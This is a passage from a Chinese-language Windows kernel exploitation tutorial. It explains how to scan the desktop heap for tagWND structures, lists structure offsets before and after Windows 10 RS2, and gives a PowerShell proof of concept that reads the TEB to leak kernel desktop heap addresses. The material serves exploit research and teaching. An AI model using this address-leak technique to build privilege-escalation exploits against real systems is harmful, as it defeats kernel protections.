
运行POC，给出如下输出。

![](upload/attach/201803/530966_ZA3BVKAYTAK3EM9.jpg)

我们可以简单的在KD中证实。

![](upload/attach/201803/530966_AAD46RYSP49S2QW.jpg)

对桌面堆的分析超出了本文的范围，更多信息可以参考<a href="elink@94bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4M7#2)9J5k6h3#2K6k6r3&6Q4x3X3g2E0K9h3y4J5L8%4y4G2k6Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6F1N6r3c8W2j5Y4g2Y4k6$3W2F1k6#2)9J5c8U0t1H3x3o6N6Q4x3V1j5H3x3g2)9J5c8U0l9@1i4K6u0r3k6r3g2K6K9%4c8G2M7q4)9J5k6r3S2W2j5i4m8Q4x3X3c8G2N6X3g2J5N6X3W2W2N6#2)9J5c8R3`.`.">here</a>。

### 扫描桌面堆

很好，下一步就是创建一个`Window`对象并扫描桌面堆来找到它。微软在Windows 8之后不再公开`tagWND`&`tagCLS`的符号了，所以我们只好在Windows 7上看看。

![](upload/attach/201803/530966_8VJHFA6GA2SWHMJ.jpg)

如我们所见，`tagWND`的2第一个`IntPtr`值是`Window`句柄（通过`CreateWindow/Ex`返回）。同时也注意到`tagWND->THRDESKHEAD->pSelf`是一个指向内核中`tagWND`的指针，我们实际上可以通过内核`tagWND`的地址减去用户`tagWND`的地址来计算出`ulClientDelta`。最后一点需要注意的是`tagWND`&`tagCLS`结构体在Windows 10 RS2中有一些变化。通过简单的逆向我们找到了一些变更的相对偏移。

**`x64 Pre RS2 (15063)`**

+ `Window handle` => `0x0`
+ `pSelf` => `0x20`
+ `pcls` => `0x98`
+ `lpszMenuNameOffset` => `pcls + 0x88`

**`x64 Post RS2 (15063)`**

+ `Window handle` => `0x0`
+ `pSelf` => `0x20`
+ `pcls` => `0xa8`
+ `lpszMenuNameOffset` => `pcls + 0x90`

在桌面堆上找到一个`Window`相当的直接，从桌面堆的基地址开始我们可以读出`IntPtr`尺寸的值并将其与特定的`Window`句柄进行比较。一旦我们匹配上了句柄，就掌握了到`tagWND`结构体起始位置的偏移。更新POC并运行。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
[StructLayout(LayoutKind.Sequential)]
public struct \_THREAD\_BASIC\_INFORMATION
{
public IntPtr ExitStatus;
public IntPtr TebBaseAddress;
public IntPtr ClientId;
public IntPtr AffinityMask;
public IntPtr Priority;
public IntPtr BasePriority;
}
public static class TEB
{
[DllImport("ntdll.dll")]
public static extern int NtQueryInformationThread(
IntPtr hThread,
int ThreadInfoClass,
ref \_THREAD\_BASIC\_INFORMATION ThreadInfo,
int ThreadInfoLength,
ref int ReturnLength);
[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentThread();
}
"@
# Pseudo handle => -2
$CurrentHandle = [TEB]::GetCurrentThread()
# ThreadBasicInformation
$THREAD\_BASIC\_INFORMATION = New-Object \_THREAD\_BASIC\_INFORMATION
$THREAD\_BASIC\_INFORMATION\_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($THREAD\_BASIC\_INFORMATION)
$RetLen = New-Object Int
$CallResult = [TEB]::NtQueryInformationThread($CurrentHandle,0,[ref]$THREAD\_BASIC\_INFORMATION,$THREAD\_BASIC\_INFORMATION\_SIZE,[ref]$RetLen)
$TEBBase = $THREAD\_BASIC\_INFORMATION.TebBaseAddress
$TEB\_Win32ClientInfo = [Int64]$TEBBase+0x800
$TEB\_UserKernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64([Int64]$TEBBase+0x828)
$TEB\_KernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB\_UserKernelDesktopHeap+0x28)
echo "`n[+] \_TEB.Win32ClientInfo: $('{0:X16}' -f $TEB\_Win32ClientInfo)"
echo "[+] User Mapped Desktop Heap: $('{0:X16}' -f $TEB\_UserKernelDesktopHeap)"
echo "[+] Kernel Desktop Heap: $('{0:X16}' -f $TEB\_KernelDesktopHeap)"
echo "[+] ulClientDelta: $('{0:X16}' -f ($TEB\_KernelDesktopHeap-$TEB\_UserKernelDesktopHeap))`n"
```
